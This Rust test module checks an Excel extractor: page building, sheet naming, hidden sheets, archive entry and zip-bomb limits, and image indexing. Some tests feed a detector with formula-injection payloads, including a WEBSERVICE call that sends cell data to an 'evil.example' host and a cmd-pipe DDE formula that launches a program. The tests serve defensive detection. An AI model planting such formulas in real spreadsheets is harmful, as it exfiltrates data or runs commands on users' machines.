        assert_eq!(pages.len(), 3);

        assert_eq!(pages[0].page_number, 1);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[2].page_number, 3);

        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("Empty"));
        assert_eq!(pages[1].section_name, None);
        assert!(
            pages[1].content.ends_with("\n\n"),
            "empty-sheet content must end with two newlines, got: {:?}",
            pages[1].content
        );

        assert_eq!(pages[0].is_blank, Some(false));
        assert_eq!(pages[2].is_blank, Some(false));
    }

    #[test]
    fn test_empty_sheet_cells_vec_produces_page_at_correct_index() {
        let workbook = make_workbook(vec![
            make_sheet("HasData", Some(vec![vec!["x".to_string()]])),
            make_sheet("EmptyCells", Some(vec![])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 2);
        assert_eq!(pages[1].page_number, 2);
        assert_eq!(pages[1].tables.len(), 0);
        assert_eq!(pages[1].is_blank, Some(true));
        assert!(pages[1].content.ends_with("\n\n"), "empty sheet must end with \\n\\n");
    }

    #[test]
    fn test_sheet_order_preserved() {
        let workbook = make_workbook(vec![
            make_sheet("Z", Some(vec![vec!["z".to_string()]])),
            make_sheet("A", Some(vec![vec!["a".to_string()]])),
            make_sheet("M", Some(vec![vec!["m".to_string()]])),
        ]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages[0].sheet_name.as_deref(), Some("Z"));
        assert_eq!(pages[1].sheet_name.as_deref(), Some("A"));
        assert_eq!(pages[2].sheet_name.as_deref(), Some("M"));
    }

    fn make_dde_workbook(cell_value: &str) -> ExcelWorkbook {
        make_workbook(vec![make_sheet("Sheet1", Some(vec![vec![cell_value.to_string()]]))])
    }

    #[test]
    fn test_dde_formula_emits_warning() {
        let workbook = make_dde_workbook("=DDE(\"winword\",\"c:\\test.doc\",\"All\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1, "exactly one DDE warning expected");
        assert!(
            warnings[0].message.contains("DDE"),
            "warning must name the formula kind: {}",
            warnings[0].message
        );
        assert!(
            warnings[0].message.contains("R1C1"),
            "warning must include cell coordinate: {}",
            warnings[0].message
        );
        assert_eq!(warnings[0].source, "excel_dde_scan");
    }

    #[test]
    fn test_webservice_formula_emits_warning() {
        let workbook = make_dde_workbook("=WEBSERVICE(\"https://evil.example/steal?data=\"&A1)");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("WEBSERVICE"), "{}", warnings[0].message);
    }

    #[test]
    fn test_hyperlink_formula_emits_warning() {
        let workbook = make_dde_workbook("=HYPERLINK(\"https://evil.example\",\"click me\")");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("HYPERLINK"), "{}", warnings[0].message);
    }

    #[test]
    fn test_cmd_pipe_formula_emits_warning() {
        let workbook = make_dde_workbook("=cmd|' /c calc'!A0");
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(warnings.len(), 1);
        assert!(warnings[0].message.contains("ExternalCall"), "{}", warnings[0].message);
    }

    #[test]
    fn test_benign_formula_string_no_warning() {
        for safe in &["=SUM(A1:A2)", "=AVERAGE(B:B)", "hello world", "42", ""] {
            let workbook = make_dde_workbook(safe);
            let warnings = scan_for_dde_warnings(&workbook);
            assert!(
                warnings.is_empty(),
                "unexpected DDE warning for safe cell {:?}: {:?}",
                safe,
                warnings
            );
        }
    }

    #[test]
    fn test_dde_warning_cap_at_100() {
        let cells: Vec<Vec<String>> = (0..200)
            .map(|i| vec![format!("=DDE(\"app\",\"topic\",\"item{}\")", i)])
            .collect();
        let workbook = make_workbook(vec![make_sheet("Big", Some(cells))]);
        let warnings = scan_for_dde_warnings(&workbook);
        assert_eq!(
            warnings.len(),
            100,
            "DDE warnings must be capped at 100, got {}",
            warnings.len()
        );
    }

    #[test]
    fn test_dde_formula_case_insensitive() {
        for variant in &[
            "=dde(\"app\",\"t\",\"i\")",
            "=DdE(\"a\",\"b\",\"c\")",
            "=webservice(\"x\")",
        ] {
            let workbook = make_dde_workbook(variant);
            let warnings = scan_for_dde_warnings(&workbook);
            assert_eq!(warnings.len(), 1, "case-insensitive match failed for {:?}", variant);
        }
    }

    #[test]
    fn test_workbook_to_internal_document_includes_dde_warnings() {
        let workbook = make_workbook(vec![make_sheet(
            "Injection",
            Some(vec![
                vec!["=DDE(\"app\",\"topic\",\"data\")".to_string()],
                vec!["normal".to_string()],
            ]),
        )]);
        let doc = ExcelExtractor::workbook_to_internal_document(&workbook, Vec::new(), Vec::new());
        let dde_warnings: Vec<_> = doc
            .processing_warnings
            .iter()
            .filter(|w| w.source == "excel_dde_scan")
            .collect();
        assert_eq!(dde_warnings.len(), 1, "one DDE warning expected in InternalDocument");
        assert!(dde_warnings[0].message.contains("DDE"), "{}", dde_warnings[0].message);
    }

    /// Both entry points charge cells and floating shape text against the same
    /// budget: cells (10 bytes) plus shape text (10 bytes) must exhaust a
    /// 15-byte `max_content_size` no matter which entry point is taken.
    #[test]
    fn charge_workbook_budget_counts_cells_and_shape_text() {
        let workbook = make_workbook(vec![make_sheet(
            "Sheet1",
            Some(vec![vec!["abcdefghij".to_string()]]),
        )]);
        let shapes = vec![XlsxShapeText {
            text: "0123456789".to_string(),
            sheet_name: "Sheet1".to_string(),
            anchor: None,
        }];

        let mut budget = SecurityBudget::from_limits(&crate::extractors::security::SecurityLimits {
            max_content_size: 15,
            ..Default::default()
        });
        assert!(
            charge_workbook_budget(&workbook, &shapes, &mut budget).is_err(),
            "cells (10 bytes) + shape text (10 bytes) must exceed the 15-byte budget"
        );

        // Without the shapes the same workbook fits: the helper charges exactly
        // what the two producers emit, nothing more.
        let mut budget = SecurityBudget::from_limits(&crate::extractors::security::SecurityLimits {
            max_content_size: 15,
            ..Default::default()
        });
        assert!(
            charge_workbook_budget(&workbook, &[], &mut budget).is_ok(),
            "cells alone (10 bytes) must fit the 15-byte budget"
        );
    }

    #[test]
    fn test_sheet_name_markdown_escape_in_heading() {
        let cells = vec![
            vec!["Revenue".to_string(), "Cost".to_string()],
            vec!["100".to_string(), "80".to_string()],
        ];
        let workbook = make_workbook(vec![make_sheet("## Profit (2025) [Q1]", Some(cells))]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());

        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert_eq!(pages.len(), 1);

        assert_eq!(pages[0].sheet_name.as_deref(), Some("## Profit (2025) [Q1]"));

        assert!(
            !pages[0].content.starts_with("## ##"),
            "double heading detected: {:?}",
            &pages[0].content[..pages[0].content.find('\n').unwrap_or(pages[0].content.len())]
        );
        let first_line = pages[0].content.lines().next().unwrap_or("");
        assert!(
            !first_line.contains("[Q1]") || first_line.contains("\\["),
            "unescaped markdown link syntax in heading: {:?}",
            first_line
        );
        assert!(pages[0].content.starts_with("## "), "content must start with H2 marker");
        assert!(pages[0].content.contains("Profit"));
    }

    /// xberg-io/xberg#119: a sheet named in the `hidden_sheets` workbook-metadata
    /// entry gets `" (hidden)"` appended to its heading, while a visible sheet's
    /// heading is untouched; its content is still fully present either way.
    #[test]
    fn should_mark_hidden_sheet_heading_but_keep_its_content() {
        let mut workbook = make_workbook(vec![
            make_sheet("Visible", Some(vec![vec!["A".to_string()]])),
            make_sheet("Hidden", Some(vec![vec!["Secret".to_string()]])),
        ]);
        workbook
            .metadata
            .insert("hidden_sheets".to_string(), "Hidden".to_string());

        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());
        let pages = doc.prebuilt_pages.as_ref().unwrap();

        assert!(pages[0].content.starts_with("## Visible\n"), "{:?}", pages[0].content);
        assert!(
            pages[1].content.starts_with("## Hidden (hidden)\n"),
            "{:?}",
            pages[1].content
        );
        assert!(pages[1].content.contains("Secret"), "hidden sheet content must survive");
    }

    #[test]
    fn should_treat_no_sheets_as_hidden_when_metadata_key_is_absent() {
        let workbook = make_workbook(vec![make_sheet("Sheet1", Some(vec![vec!["A".to_string()]]))]);
        let doc = ExcelExtractor::build_internal_document(&workbook, Vec::new(), Vec::new());
        let pages = doc.prebuilt_pages.as_ref().unwrap();
        assert!(pages[0].content.starts_with("## Sheet1\n"), "{:?}", pages[0].content);
    }

    /// Build a minimal in-memory `.xlsx` zip with one working sheet, plus `extra_entries`
    /// padding parts, so the total ZIP entry count is `5 + extra_entries` (the five base
    /// parts: `[Content_Types].xml`, `_rels/.rels`, `xl/workbook.xml`,
    /// `xl/_rels/workbook.xml.rels`, `xl/worksheets/sheet1.xml`).
    #[cfg(feature = "excel")]
    fn build_test_xlsx(extra_parts: &[(&str, &[u8])]) -> Vec<u8> {
        use std::io::{Cursor, Write};
        use zip::write::SimpleFileOptions;

        let mut buffer = Vec::new();
        {
            let mut zip = zip::ZipWriter::new(Cursor::new(&mut buffer));
            let options = SimpleFileOptions::default();

            zip.start_file("[Content_Types].xml", options).unwrap();
            zip.write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
  <Override PartName="/xl/worksheets/sheet1.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>"#,
            )
            .unwrap();

            zip.start_file("_rels/.rels", options).unwrap();
            zip.write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="xl/workbook.xml"/>
</Relationships>"#,
            )
            .unwrap();

            zip.start_file("xl/workbook.xml", options).unwrap();
            zip.write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
  xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
</workbook>"#,
            )
            .unwrap();

            zip.start_file("xl/_rels/workbook.xml.rels", options).unwrap();
            zip.write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"
    Target="worksheets/sheet1.xml"/>
</Relationships>"#,
            )
            .unwrap();

            zip.start_file("xl/worksheets/sheet1.xml", options).unwrap();
            zip.write_all(
                br#"<?xml version="1.0" encoding="UTF-8"?>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheetData>
    <row r="1"><c r="A1" t="inlineStr"><is><t>Hello</t></is></c></row>
  </sheetData>
</worksheet>"#,
            )
            .unwrap();

            for (name, data) in extra_parts {
                zip.start_file(*name, options).unwrap();
                zip.write_all(data).unwrap();
            }

            zip.finish().unwrap();
        }
        buffer
    }

    /// GH#642: the archive entry-count ceiling for XLSX must come from
    /// `config.security_limits.max_files_in_archive`, the same as the DOCX/PPTX top-level
    /// containers, not be silently unenforced. This uses a limit (3) well below the base
    /// 5-entry archive, so the unfixed code (no entry-count check at all in
    /// `read_excel_bytes`) always extracts successfully here, while the fixed code rejects it.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_honours_configured_archive_entry_limit() {
        let data = build_test_xlsx(&[]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig {
            security_limits: Some(crate::extractors::security::SecurityLimits {
                max_files_in_archive: 3,
                ..Default::default()
            }),
            ..Default::default()
        };

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        assert!(
            result.is_err(),
            "an XLSX archive with more entries than the configured max_files_in_archive must be rejected"
        );
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains('3'),
            "error should mention the configured limit (3), got: {}",
            err_msg
        );
    }

    /// Sibling of the rejection test above: the same archive shape, but under a configured
    /// limit that comfortably fits it, must still extract successfully.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_succeeds_under_configured_archive_entry_limit() {
        let data = build_test_xlsx(&[]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig {
            security_limits: Some(crate::extractors::security::SecurityLimits {
                max_files_in_archive: 50,
                ..Default::default()
            }),
            ..Default::default()
        };

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        assert!(
            result.is_ok(),
            "an XLSX archive within the configured max_files_in_archive must extract successfully: {:?}",
            result.err()
        );
    }

    /// A normal workbook with no `security_limits` override (the common case) must still
    /// extract successfully under the default `SecurityLimits::max_files_in_archive`.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_succeeds_under_default_archive_entry_limit() {
        let data = build_test_xlsx(&[]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig::default();

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        assert!(
            result.is_ok(),
            "a normal workbook must extract successfully under the default archive entry limit: {:?}",
            result.err()
        );
    }

    /// Gap: XLSX had only an entry-count check (`check_zip_entry_count`, now
    /// `validate_zip_container`'s first half) -- no `ZipBombValidator`, so nothing
    /// ever checked aggregate declared uncompressed size or compression ratio.
    /// `ZipBombValidator` was previously uncallable from this file at all: its cfg
    /// gate (`archives`/`hwpx`/`iwork`/`office`) did not include `excel`. Against
    /// unfixed code this test fails: a highly compressible extra member sails
    /// through regardless of `max_compression_ratio`.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_rejects_high_compression_ratio_archive() {
        // 64 KiB of a single repeated byte, deflated: compresses far past any sane
        // ratio in a few hundred bytes, so the archive stays tiny while the ratio
        // comparison still fires.
        let bomb_payload = vec![0u8; 64 * 1024];
        let data = build_test_xlsx(&[("xl/media/bomb.bin", &bomb_payload)]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig {
            security_limits: Some(crate::extractors::security::SecurityLimits {
                max_compression_ratio: 5,
                ..Default::default()
            }),
            ..Default::default()
        };

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        let err = result.expect_err("a highly compressible member must be rejected under a low ratio limit");
        assert!(
            matches!(err, crate::error::XbergError::Security { .. }),
            "expected XbergError::Security, got: {err:?}"
        );
        assert!(
            err.to_string().to_lowercase().contains("ratio") || err.to_string().contains("ZIP bomb"),
            "error should name the ratio violation, got: {err}"
        );
    }

    /// Sibling of the ratio test above, bounding aggregate declared uncompressed size
    /// instead. Against unfixed code this also fails: no `max_archive_size` check
    /// existed for XLSX at all.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_rejects_archive_exceeding_max_size() {
        // Pseudo-random via a simple LCG so the entry's declared uncompressed size is
        // what trips the limit, not the ratio check.
        let mut state: u32 = 0x1234_5678;
        let payload: Vec<u8> = (0..8192)
            .map(|_| {
                state = state.wrapping_mul(1_103_515_245).wrapping_add(12_345);
                (state >> 16) as u8
            })
            .collect();
        let data = build_test_xlsx(&[("xl/media/big.bin", &payload)]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig {
            security_limits: Some(crate::extractors::security::SecurityLimits {
                max_archive_size: 1024,
                max_compression_ratio: usize::MAX,
                ..Default::default()
            }),
            ..Default::default()
        };

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        let err = result.expect_err("an archive declaring more bytes than max_archive_size must be rejected");
        assert!(
            matches!(err, crate::error::XbergError::Security { .. }),
            "expected XbergError::Security, got: {err:?}"
        );
    }

    /// Positive control for both tests above: a validator that rejects everything
    /// would pass the negative tests too, so this proves an ordinary workbook's exact
    /// cell text still extracts under the default `SecurityLimits`.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_positive_control_exact_text_under_default_limits() {
        let data = build_test_xlsx(&[]);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig::default();

        let doc = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await
            .expect("an ordinary workbook must extract under the default security limits");

        let pages = doc
            .prebuilt_pages
            .expect("workbook extraction always builds prebuilt pages");
        assert!(
            pages.iter().any(|p| p.content.contains("Hello")),
            "extracted content must contain the source cell's exact text, got: {:?}",
            pages
        );
    }

    /// With no `security_limits` override the container must still enforce the default
    /// `SecurityLimits::max_files_in_archive`: "unset" means the default ceiling, not "no
    /// ceiling". An archive past that default must be rejected.
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_rejects_archive_over_default_entry_limit() {
        let default_limit = crate::extractors::security::SecurityLimits::default().max_files_in_archive;
        // `build_test_xlsx` writes five fixed parts of its own, so this alone already
        // exceeds the ceiling. Rebased onto the current helper, which takes the extra
        // parts as a slice rather than a count.
        let names: Vec<String> = (0..=default_limit).map(|i| format!("xl/extra_{i}.xml")).collect();
        let extra_parts: Vec<(&str, &[u8])> = names.iter().map(|n| (n.as_str(), b"<x/>".as_slice())).collect();
        let data = build_test_xlsx(&extra_parts);
        let extractor = ExcelExtractor::new();
        let config = ExtractionConfig::default();
        assert!(
            config.security_limits.is_none(),
            "this test must exercise the unset fallback, not an explicit limit"
        );

        let result = extractor
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &config,
            )
            .await;

        assert!(
            result.is_err(),
            "an archive over the default max_files_in_archive must be rejected when no limit is configured"
        );
        let err_msg = result.unwrap_err().to_string();
        assert!(
            err_msg.contains(&default_limit.to_string()),
            "error should mention the default limit ({default_limit}), got: {err_msg}"
        );
    }

    /// A workbook whose sheet anchors one picture at cell A5. The picture must
    /// become exactly one image element whose index is its position in
    /// `doc.images` — never a drawing-local id — and the owning sheet's page must
    /// point at that image. Those are the two ways an image-index bug can appear
    /// (the docx extractor indexed elements by drawing position, and image
    /// indices were once confused with element positions here).
    #[cfg(feature = "excel")]
    #[tokio::test]
    async fn test_xlsx_extract_content_emits_one_image_element_per_media_part() {
        use crate::types::internal::ElementKind;

        // Only the magic bytes matter here: the extractor stores the part as-is
        // and detects the format from the signature.
        let png: &[u8] = b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR";
        let data = build_test_xlsx(&[
            ("xl/media/image1.png", png),
            (
                "xl/worksheets/_rels/sheet1.xml.rels",
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/drawing" Target="../drawings/drawing1.xml"/>
</Relationships>"#,
            ),
            (
                "xl/drawings/drawing1.xml",
                br#"<?xml version="1.0" encoding="UTF-8"?>
<xdr:wsDr xmlns:xdr="http://schemas.openxmlformats.org/drawingml/2006/spreadsheetDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <xdr:twoCellAnchor editAs="oneCell">
    <xdr:from><xdr:col>0</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>4</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:from>
    <xdr:to><xdr:col>2</xdr:col><xdr:colOff>0</xdr:colOff><xdr:row>8</xdr:row><xdr:rowOff>0</xdr:rowOff></xdr:to>
    <xdr:pic>
      <xdr:nvPicPr><xdr:cNvPr id="2" name="Picture 1" descr="A chart"/></xdr:nvPicPr>
      <xdr:blipFill><a:blip r:embed="rId1"/></xdr:blipFill>
    </xdr:pic>
  </xdr:twoCellAnchor>
</xdr:wsDr>"#,
            ),
            (
                "xl/drawings/_rels/drawing1.xml.rels",
                br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image1.png"/>
</Relationships>"#,
            ),
        ]);

        let doc = ExcelExtractor::new()
            .extract_content(
                &data,
                "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
                &ExtractionConfig::default(),
            )
            .await
            .expect("a workbook with a picture must extract");

        assert_eq!(doc.images.len(), 1, "one media part must yield exactly one image");
        assert_eq!(doc.images[0].source_path.as_deref(), Some("xl/media/image1.png"));
        assert_eq!(doc.images[0].format, "png", "the format must come from the magic bytes");
        assert_eq!(doc.images[0].page_number, Some(1), "the picture is anchored to sheet 1");
        assert_eq!(doc.images[0].description.as_deref(), Some("A chart"));
        assert!(!doc.images[0].data.is_empty(), "the original bytes must be kept");

        let image_elements: Vec<usize> = doc
            .elements
            .iter()
            .enumerate()
            .filter(|(_, element)| matches!(element.kind, ElementKind::Image { .. }))
            .map(|(position, _)| position)
            .collect();
        assert_eq!(image_elements.len(), 1, "every image must be referenced by exactly one element");
        let ElementKind::Image { image_index } = doc.elements[image_elements[0]].kind else {
            panic!("expected an image element");
        };
        assert_eq!(image_index, 0, "the element must index `doc.images` positionally");
        assert_eq!(doc.images[image_index as usize].image_index, image_index);

        let table_position = doc
            .elements
            .iter()
            .position(|element| matches!(element.kind, ElementKind::Table { .. }))
            .expect("the sheet's table element");
        assert!(
            image_elements[0] > table_position,
            "the picture must follow the sheet it is anchored to"
        );

        let pages = doc.prebuilt_pages.as_ref().expect("excel extraction always builds pages");
        assert_eq!(pages[0].image_indices, vec![image_index]);
    }
}
